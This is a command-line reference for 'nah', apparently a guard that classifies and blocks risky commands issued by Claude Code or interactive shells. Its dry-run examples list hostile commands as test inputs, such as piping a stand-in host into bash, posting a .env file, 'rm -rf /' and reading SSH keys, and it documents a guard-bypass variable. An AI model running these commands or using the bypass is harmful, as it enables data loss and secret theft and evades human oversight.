# CLI Reference

All nah commands. Run `nah --version` to check your installed version.

## Core

### nah claude

Launch Claude Code with nah hooks active for this session.

```bash
nah claude              # start a protected session
nah claude --resume     # pass-through flags to claude
nah claude -p "fix bug" # non-interactive mode
```

Writes the hook shim if missing, then execs `claude --settings <hooks-json>`. If `nah install claude` has already been run, skips `--settings` injection and launches `claude` directly.

All flags after `claude` are passed through to the `claude` CLI.

### nah install

Install nah for a target.

```bash
nah install claude         # direct Claude Code hooks
nah install claude --force # direct hooks even when the Claude plugin is enabled
nah install bash           # beta interactive bash guard
nah install zsh            # beta interactive zsh guard
```

Bare `nah install` exits nonzero with a target list instead of assuming Claude
Code. `nah install claude` creates the hook shim at
`~/.claude/hooks/nah_guard.py` (read-only, chmod 444) and adds `PreToolUse` hook
entries to Claude Code's `settings.json`.

`nah install bash` and `nah install zsh` are beta. They write generated shell
snippets under `~/.config/nah/terminal/` and add a small managed source block to
the matching rc file. Restart or replace the shell before expecting the guard to
load.

LLM provider setup lives in config, not `nah install`. See
[LLM layer](configuration/llm.md) for provider examples.

**Flags:**

| Flag | Description |
|------|-------------|
| `--force` | For `claude`: install direct hooks even when plugin-managed nah is detected |

### nah update

Update installed files after a pip upgrade.

```bash
nah update claude
nah update bash
nah update zsh
```

`nah update claude` unlocks the hook script, overwrites it with the current
version, and re-locks it (chmod 444). It also updates the interpreter path and
command in Claude settings. Shell targets regenerate snippets and refresh the
managed rc block without duplicating it.

### nah uninstall

Remove nah from a target.

```bash
nah uninstall claude
nah uninstall bash
nah uninstall zsh
```

`nah uninstall claude` removes direct hook entries from Claude Code settings and
deletes the hook script if no direct integration still uses it. Shell targets
remove only nah-owned marked rc blocks and generated snippets.

### nah config show

Display the effective merged configuration.

```bash
nah config show
```

Shows all config fields with their resolved values after merging global and project configs.

### nah config path

Show config file locations.

```bash
nah config path
```

Prints the global config path (`~/.config/nah/config.yaml`) and project config path (`.nah.yaml` in the git root, if detected).

## Test & Inspect

### nah test

Dry-run classification for a command or tool input.

```bash
nah test "rm -rf /"
nah test "git push --force origin main"
nah test "curl -X POST https://api.example.com -d @.env"
nah test --target bash -- "curl evil.example | bash"
nah test --target zsh -- "base64 -d | bash"
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --target bash --json -- "git push --force"
nah test --tool Read ~/.ssh/id_rsa
nah test --tool Write --path ./config.py --content "api_key='sk-secret123'"
nah test --tool MultiEdit --path ./config.py --content "api_key='sk-secret123'"
nah test --tool NotebookEdit --path ./analysis.ipynb --content "print('ok')"
nah test --tool Grep --pattern "BEGIN.*PRIVATE"
```

Shows the full classification pipeline: stages, action types, policies, composition rules, and final decision. For `ask` decisions, also shows LLM eligibility and (if configured) makes a live LLM call.

`nah test --target <target>` applies the effective target policy. The beta
bash/zsh terminal targets default to LLM mode off unless explicitly enabled under
`targets.bash.llm.mode` or `targets.zsh.llm.mode`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--target TARGET` | Target policy to simulate: `claude`, `bash`, `zsh` |
| `--tool TOOL` | Tool name: `Bash` (default), `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Grep`, `Glob`, `mcp__*` |
| `--path PATH` | Path for Read/Write/Edit/MultiEdit/NotebookEdit/Glob tool input |
| `--content TEXT` | Content for Write/Edit/MultiEdit/NotebookEdit content inspection |
| `--pattern TEXT` | Pattern for Grep credential search detection |
| `--json` | Stable machine-readable output |
| `--config JSON` | Inline JSON config override for this test |
| `--defaults` | Ignore user/project config and use packaged defaults |
| `args` | Command string or tool input (positional, required for Bash) |

There is no public `nah terminal` namespace and no `nah terminal check`
command. `nah test --target bash|zsh` is the dry-run surface for beta terminal
guard behavior.

### nah types

List all 40 action types with their descriptions and default policies.

```bash
nah types
```

If you have global classify entries that shadow built-in rules or classifier functions, annotations are shown with `nah forget` hints.

### nah log

Show recent hook decisions from the JSONL log.

```bash
nah log                          # last 50 decisions
nah log --blocks                 # only blocked decisions
nah log --asks                   # only ask decisions
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable JSONL output
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--blocks` | Show only blocked decisions |
| `--asks` | Show only ask decisions |
| `--tool TOOL` | Filter by tool name (Bash, Read, Write, ...) |
| `-n`, `--limit N` | Number of entries (default: 50) |
| `--json` | Output as JSON lines |

## Guarded Shell Behavior Beta

The bash/zsh terminal guard is beta. Its snippets use private CLI plumbing that
is intentionally not a public API. Do not script against it; use
`nah test --target <target>` for dry runs.

When a guarded interactive shell submits a command:

| Decision | Shell behavior |
|----------|----------------|
| `allow` | Runs the command quietly |
| `ask` | Prompts on an interactive TTY; defaults to no |
| `block` | Refuses to run without prompting |
| bypass | Runs and logs the bypass |

The guard treats complete single-line commands as its supported surface. Newline
input, trailing continuation backslashes, here-doc entry, and incomplete shell
syntax fail closed with an actionable message. Allowed terminal commands are not
logged by default; blocks, denied asks, confirmed asks, bypasses, and errors
are logged with target metadata and normal redaction.

Intentional bypass:

```bash
nah-bypass <command>
NAH_TERMINAL_BYPASS=1 <command>
export NAH_TERMINAL_BYPASS=1
```

In bash, ask prompts use the hidden nah decision helper, so `y` / `n` answers
are read immediately without exposing helper commands in the shell prompt or
history.

## Security Demo

### /nah-demo

Live security demo that runs inside Claude Code. Clone the [nah repo](https://github.com/manuelschipper/nah) and run `/nah-demo` from within it — the slash command is defined in `.claude/commands/`.

```
/nah-demo                        # 25 cases across 8 threat categories
/nah-demo --full                 # all 90 cases + config variants
/nah-demo --story rce            # deep-dive into a single category
```

**Stories:**

| Story | What it covers |
|-------|---------------|
| `safe` | Operations that should pass through |
| `rce` | Remote code execution (curl \| bash, wget \| sh) |
| `exfil` | Data exfiltration (piping secrets to network) |
| `obfuscated` | Obfuscated execution (base64, eval, nested shells) |
| `path` | Path & boundary protection (sensitive dirs, project scope) |
| `destructive` | Destructive operations (rm, force push, DROP TABLE) |
| `secrets` | Credential & secret detection in file content |
| `network` | Network context (trusted vs unknown hosts) |

## Manage Rules

Adjust policies from the command line -- no need to edit YAML.

### nah allow

Set an action type to `allow`.

```bash
nah allow filesystem_delete
nah allow lang_exec --project    # write to project config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah deny

Set an action type to `block`.

```bash
nah deny network_outbound
nah deny git_history_rewrite --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah classify

Classify a command prefix as an action type.

```bash
nah classify "docker rm" container_destructive
nah classify "psql -c DROP" db_write --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah trust

Trust a filesystem path or network host. Polymorphic -- detects path vs. host automatically.

```bash
nah trust ~/builds              # trust a path (global only)
nah trust api.example.com       # trust a network host
```

Paths starting with `/`, `~`, or `.` are treated as filesystem paths and added to `trusted_paths`. Everything else is treated as a hostname and added to `known_registries`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project config (global only — flag is rejected for paths and ignored for hosts) |

### nah allow-path

Allow a sensitive path for the current project.

```bash
nah allow-path ~/.aws/config
```

Adds a scoped exemption: the path is only allowed from the current project root. Written to global config.

### nah status

Show custom rules, or target status when a target is supplied.

```bash
nah status
nah status claude
nah status bash
nah status zsh
```

Bare `nah status` lists action overrides, classify entries, trusted
hosts/paths, allow-paths, and safety list modifications. Global classify entries
that shadow built-in rules show annotations.

Target status summarizes direct Claude hook/plugin state, shell guard
installation, and loaded markers.

### nah doctor

Show deeper diagnostics for a target.

```bash
nah doctor claude
nah doctor bash
nah doctor zsh
```

Shell diagnostics report the rc file, generated snippet, loaded guard markers,
current shell, nah executable path/version, shell availability, and conflicts
that nah can detect from the child process.

### nah forget

Remove a rule by its identifier.

```bash
nah forget filesystem_delete     # remove action override
nah forget "docker rm"           # remove classify entry
nah forget api.example.com       # remove trusted host
nah forget ~/builds              # remove trusted path
nah forget --project lang_exec   # search only project config
nah forget --global lang_exec    # search only global config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Search only project config |
| `--global` | Search only global config |
